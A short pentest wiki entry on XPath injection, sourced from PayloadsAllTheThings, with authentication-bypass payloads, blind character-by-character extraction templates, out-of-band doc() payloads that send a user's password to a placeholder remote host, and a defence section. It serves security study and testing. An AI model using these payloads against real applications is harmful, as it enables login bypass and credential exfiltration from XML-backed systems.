---
title: "XPath Injection"
type: technique
tags: [exploitation, injection, web, xpath, xml]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-xpathinjection]
---

# XPath Injection

## What it is

Injecting into XPath queries built from user input to read or bypass logic over an XML document/datastore. Conceptually SQL injection for XML - no privilege model in XPath, so the whole document is reachable. Related: [[sql-injection]], [[xxe]].

## How it works / where found
Apps that authenticate or search against XML (`users.xml`, config stores, SOAP/SAML backends, legacy XML databases) by concatenating input into an XPath like `//user[name='INPUT' and password='INPUT']`. Detect by injecting `'` -> XPath error or a changed result set.

## Methodology
### Auth bypass / basic injection
Terminate and rewrite the predicate:
```text
' or '1'='1          ' or ''='          x' or 1=1 or 'x'='y
') and starts-with(../password,'c
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
@*    //*    count(/child::node())
```
### Blind extraction (boolean)
```text
and string-length(account)=SIZE
substring(//user[userid=5]/username,POS,1)=codepoints-to-string(ORD)
```
Iterate length, then character by character (XPath 2.0 adds `codepoints-to-string`, `matches()`, `lower-case()`).

### Out-of-band
If the parser supports it, `doc()` fetches a remote resource (SMB/HTTP) for blind exfil:
```text
... and doc('//10.10.10.10/SHARE')
... and doc(concat('http://oob/',encode-for-uri(//user[1]/password)))
```

## Real-world
Common in legacy SOAP/XML auth and CMSes that store users in XML; appears in CTFs and older enterprise apps. Often pairs with [[xxe]] on the same XML endpoint.

## Detection and defence
Use **parameterized XPath** (precompiled `XPathExpression` with variable resolver) instead of string concatenation; escape `'"<>` or input-validate; least-privilege the XML source; disable external resource resolution (`doc()`/entities) to kill OOB and XXE.

## Tools
- [xcat](https://github.com/orf/xcat) - automated XPath data retrieval.
- [xxxpwn](https://github.com/feakk/xxxpwn) / xxxpwn_smart - blind XPath extraction.
- [XmlChor](https://github.com/Harshal35/XMLCHOR), xpath-blind-explorer.

## Sources
- PayloadsAllTheThings - XPATH Injection
